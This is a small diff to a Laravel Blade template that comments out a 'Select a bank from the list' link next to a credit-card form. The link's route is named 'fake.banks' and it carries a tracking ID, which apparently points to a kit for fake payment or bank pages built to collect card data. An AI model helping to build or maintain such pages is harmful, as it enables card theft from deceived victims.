@@ -121,10 +121,10 @@
 
                             </div>
                         </div>
-                        <div>
-                            <a class="pseudo-link_2" href="{{subRoute('fake.banks',['track_id'=>$fake->track_id])}}">
-                                {{__("Select a bank from the list")}}</a>
-                        </div>
+{{--                        <div>--}}
+{{--                            <a class="pseudo-link_2" href="{{subRoute('fake.banks',['track_id'=>$fake->track_id])}}">--}}
+{{--                                {{__("Select a bank from the list")}}</a>--}}
+{{--                        </div>--}}
                         <div class="credit-card-form__submit">
 
                             <div class="credit-card-form__submit-inner">
